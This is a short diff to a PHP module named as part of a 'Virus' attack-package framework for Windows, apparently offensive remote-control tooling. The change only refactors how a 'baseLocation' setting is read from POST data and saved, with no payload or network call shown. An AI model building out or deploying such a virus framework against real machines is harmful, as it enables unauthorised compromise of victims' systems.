@@ -1,6 +1,8 @@
 <?php
 
-$baseLocation = $this->requestData->postCheck("baseLocation");
+use Kelvinho\Virus\Attack\Packages\Windows\OneTime\NewVirus;
 
-$this->setBaseLocation($_POST["baseLocation"]);
+/** @var NewVirus $this */
+
+$this->setBaseLocation($this->requestData->postCheck("baseLocation"));
 $this->saveState();
